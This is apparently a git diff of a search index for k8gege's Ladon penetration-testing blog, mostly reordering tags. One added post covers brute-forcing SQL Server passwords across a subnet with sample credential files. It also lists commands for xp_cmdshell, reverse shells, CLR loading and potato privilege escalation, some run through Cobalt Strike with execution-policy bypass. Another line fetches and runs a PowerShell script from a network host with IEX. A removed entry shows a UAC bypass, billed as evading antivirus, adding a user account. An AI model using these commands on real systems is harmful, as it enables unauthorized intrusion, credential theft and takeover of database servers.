@@ -1331,8 +1331,8 @@
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -2512,8 +2512,8 @@
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -3002,8 +3002,8 @@ window.location.href="http://k8gege.org/Ladon/CVE-2024-45216.html";
 <p>PS: TXT存放各种IP网段，全网无差别扫描</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Apache Solr</tag>
@@ -3092,8 +3092,8 @@ window.location.href="http://k8gege.org/Ladon/CVE-2024-29973.html";
 <h3 id="DownLoad"><a href="#DownLoad" class="headerlink" title="DownLoad"></a>DownLoad</h3><p><a href="https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar</a><br><a href="https://github.com/k8gege/Ladon/blob/master/LadonExp.exe" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/blob/master/LadonExp.exe</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Zyxel</tag>
@@ -3303,6 +3303,48 @@ window.location.href="http://k8gege.org/Ladon/OracleScan.html";
       </tags>
   </entry>
   <entry>
+    <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
+    <url>/p/MssqlScan.html</url>
+    <content><![CDATA[<p style="color:#fff;"> 
+<% <span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+
+%>
+</%></p>
+
+<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/MssqlScan.html";
+</script>
+
+
+<h3 id="1433端口-Mssql数据库密码爆破"><a href="#1433端口-Mssql数据库密码爆破" class="headerlink" title="1433端口 Mssql数据库密码爆破"></a>1433端口 Mssql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MssqlScan</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
+<h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
+<p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p>
+<h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p>
+<h5 id="Oracle同理"><a href="#Oracle同理" class="headerlink" title="Oracle同理"></a>Oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OrcleScan</p>
+<h5 id="Mysql无需指定数据库名"><a href="#Mysql无需指定数据库名" class="headerlink" title="Mysql无需指定数据库名"></a>Mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MssqlScan</p>
+<h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载MysqlScan-1521端口弱口令爆破"><a href="#远程加载MysqlScan-1521端口弱口令爆破" class="headerlink" title="远程加载MysqlScan 1521端口弱口令爆破"></a>远程加载MysqlScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon.ps1&#39;</a>); Ladon 192.168.1.141 MysqlScan”</p>
+<h3 id="Kali、Linux、Mac、路由器等操作系统"><a href="#Kali、Linux、Mac、路由器等操作系统" class="headerlink" title="Kali、Linux、Mac、路由器等操作系统"></a>Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 MysqlScan<br><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
+<h3 id="Mssql数据库远程提权工具"><a href="#Mssql数据库远程提权工具" class="headerlink" title="Mssql数据库远程提权工具"></a>Mssql数据库远程提权工具</h3><p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/LadonStudy.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">本地:</span><br><span class="line"></span><br><span class="line">Ladon MssqlCmd host info</span><br><span class="line">Ladon MssqlCmd host open_shell</span><br><span class="line">Ladon MssqlCmd host close_shell</span><br><span class="line">Ladon MssqlCmd host xp_cmdshell cmdline</span><br><span class="line">Ladon MssqlCmd host ws_shell cmdline</span><br><span class="line">Ladon MssqlCmd host r_shell cmdline</span><br><span class="line">Ladon MssqlCmd host py_shell cmdline</span><br><span class="line">Ladon MssqlCmd host install_clr</span><br><span class="line">Ladon MssqlCmd host uninstall_clr</span><br><span class="line">Ladon MssqlCmd host clr_exec cmdline</span><br><span class="line">Ladon MssqlCmd host clr_efspotato cmdline</span><br><span class="line">Ladon MssqlCmd host clr_badpotato cmdline</span><br><span class="line"></span><br><span class="line">远程:</span><br><span class="line"></span><br><span class="line">Ladon MssqlCmd host user pass master info</span><br><span class="line">Ladon MssqlCmd host port user pass master open_shell</span><br><span class="line">Ladon MssqlCmd host port user pass master close_shell</span><br><span class="line">Ladon MssqlCmd host user pass master xp_cmdshell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master ws_shell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master r_shell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master py_shell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master install_clr</span><br><span class="line">Ladon MssqlCmd host user pass master uninstall_clr</span><br><span class="line">Ladon MssqlCmd host user pass master clr_exec cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master clr_efspotato cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master clr_badpotato cmdline</span><br></pre></td></tr></table></figure>
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MssqlCmd.png"></p>
+<h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本机:</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host info</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host open_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host close_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host xp_cmdshell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host ws_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host r_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host py_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host install_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host uninstall_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_exec cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_efspotato cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_badpotato cmdline</span><br><span class="line"></span><br><span class="line">远程:</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master info</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host port user pass master open_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host port user pass master close_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master xp_cmdshell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master ws_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master r_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master py_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master install_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master uninstall_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_exec cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_efspotato cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_badpotato cmdline</span><br></pre></td></tr></table></figure>
+
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
     <url>/p/MysqlScan.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
@@ -3319,46 +3361,6 @@ window.location.href="http://k8gege.org/Ladon/MysqlScan.html";
 
 
 <h3 id="3306端口-Mysql数据库密码爆破"><a href="#3306端口-Mysql数据库密码爆破" class="headerlink" title="3306端口 Mysql数据库密码爆破"></a>3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure>
-
-<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
-<h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
-<p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p>
-<h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p>
-<h5 id="Oracle同理"><a href="#Oracle同理" class="headerlink" title="Oracle同理"></a>Oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OrcleScan</p>
-<h5 id="Mysql无需指定数据库名"><a href="#Mysql无需指定数据库名" class="headerlink" title="Mysql无需指定数据库名"></a>Mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MssqlScan</p>
-<h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载MysqlScan-1521端口弱口令爆破"><a href="#远程加载MysqlScan-1521端口弱口令爆破" class="headerlink" title="远程加载MysqlScan 1521端口弱口令爆破"></a>远程加载MysqlScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon.ps1&#39;</a>); Ladon 192.168.1.141 MysqlScan”</p>
-<h3 id="Kali、Linux、Mac、路由器等操作系统"><a href="#Kali、Linux、Mac、路由器等操作系统" class="headerlink" title="Kali、Linux、Mac、路由器等操作系统"></a>Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 MysqlScan<br><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
-<h3 id="Mysql数据库远程提权工具"><a href="#Mysql数据库远程提权工具" class="headerlink" title="Mysql数据库远程提权工具"></a>Mysql数据库远程提权工具</h3><p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlStudy.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlCmd.png"></p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
-<div style="text-align: center; width: 710px; border: green solid 0px;">
-<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
-</div>]]></content>
-      <categories>
-        <category>Ladon</category>
-      </categories>
-      <tags>
-        <tag>Ladon</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
-    <url>/p/MysqlScan.html</url>
-    <content><![CDATA[<p style="color:#fff;"> 
-<% <span class="archive-article-date">
-Visit <span id="busuanzi_value_page_pv"></span>
-
-%>
-</%></p>
-
-<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
-<script language="javascript" type="text/javascript">
-window.location.href="http://k8gege.org/Ladon/MssqlScan.html";
-</script>
-
-
-<h3 id="1433端口-Mssql数据库密码爆破"><a href="#1433端口-Mssql数据库密码爆破" class="headerlink" title="1433端口 Mssql数据库密码爆破"></a>1433端口 Mssql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MssqlScan</span><br></pre></td></tr></table></figure>
 
 <p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
 <h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
@@ -3647,8 +3649,8 @@ window.location.href="/Ladon/CVE-2022-36537.html";
 </div>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -6437,8 +6439,8 @@ window.location.href="http://k8gege.org/Ladon/cve-2020-0688.html";
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>CVE-2020-0688</tag>
@@ -6939,8 +6941,8 @@ Visit <span id="busuanzi_value_page_pv"></span>
         <category>嗅探</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Sniffer</tag>
         <tag>FtpSniffer</tag>
         <tag>HttpSniffer</tag>
@@ -7135,8 +7137,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>远程执行</category>
         <category>内网渗透</category>
+        <category>远程执行</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -7241,8 +7243,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>提权</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -7504,8 +7506,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>密码</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -7723,8 +7725,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -7809,8 +7811,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Cobalt Strike</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
       </tags>
   </entry>
@@ -7853,13 +7855,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
 ]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -7975,14 +7977,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ActiveMQ</tag>
         <tag>CVE-2016-3088</tag>
@@ -7999,14 +8001,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ThinkPHP</tag>
       </tags>
@@ -8024,14 +8026,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -8055,14 +8057,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -8207,8 +8209,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>PowerShell</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>PowerShell</tag>
       </tags>
   </entry>
@@ -8250,9 +8252,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Apache</tag>
         <tag>Solr</tag>
+        <tag>Exp</tag>
         <tag>Ladon</tag>
         <tag>0day</tag>
       </tags>
@@ -8271,8 +8273,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -8536,8 +8538,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -8593,8 +8595,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -8699,9 +8701,9 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -8742,9 +8744,9 @@ Microsoft Windows 10 for 32-bit Systems 0
 <p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
       <categories>
         <category>工具</category>
+        <category>Cobalt Strike</category>
         <category>免杀</category>
         <category>Metasploit</category>
-        <category>Cobalt Strike</category>
         <category>ShellCode</category>
       </categories>
       <tags>
@@ -8794,8 +8796,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>Struts2</tag>
         <tag>GetShell</tag>
       </tags>
@@ -8812,8 +8814,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -8890,8 +8892,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -9036,9 +9038,9 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
       <categories>
         <category>工具</category>
+        <category>Cobalt Strike</category>
         <category>免杀</category>
         <category>Metasploit</category>
-        <category>Cobalt Strike</category>
         <category>ShellCode</category>
         <category>Python</category>
       </categories>
@@ -9066,12 +9068,12 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>&nbsp;</p>
 <p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>MS17010</tag>
         <tag>SMB</tag>
       </tags>
@@ -9169,8 +9171,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
       </tags>
@@ -9322,38 +9324,15 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Zimbra</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
